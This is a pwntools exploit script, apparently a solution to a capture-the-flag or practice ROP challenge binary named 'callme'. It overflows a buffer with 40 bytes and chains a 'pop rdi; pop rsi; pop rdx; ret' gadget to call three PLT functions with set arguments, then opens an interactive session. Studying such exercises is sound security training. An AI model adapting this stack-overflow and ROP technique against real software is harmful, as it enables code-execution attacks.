#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./callme')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

pop3 = 0x401ab0 # : pop rdi ; pop rsi ; pop rdx ; ret

payload = (
    b"A" * 40 +
    p64(0x4017d9) + # : ret
    p64(pop3) +
    p64(0x1) +
    p64(0x2) +
    p64(0x3) +
    p64(exe.plt["callme_one"]) +

    p64(pop3) +
    p64(0x1) +
    p64(0x2) +
    p64(0x3) +
    p64(exe.plt["callme_two"]) +

    p64(pop3) +
    p64(0x1) +
    p64(0x2) +
    p64(0x3) +
    p64(exe.plt["callme_three"])
)
io.sendline(payload)

io.interactive()

